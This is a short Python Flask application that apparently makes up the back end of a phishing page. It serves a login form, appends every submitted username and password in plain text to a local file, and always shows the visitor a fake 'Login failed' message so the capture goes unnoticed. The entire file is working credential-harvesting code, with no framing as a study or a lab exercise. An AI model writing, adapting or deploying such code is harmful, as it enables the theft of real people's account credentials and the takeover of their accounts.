from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Save to local file
    with open('data.txt', 'a') as f:
        f.write(f"Username: {username} | Password: {password}\n")

    return "<h1>Login failed! Try again later.</h1>"

if __name__ == '__main__':
    app.run(debug=False)
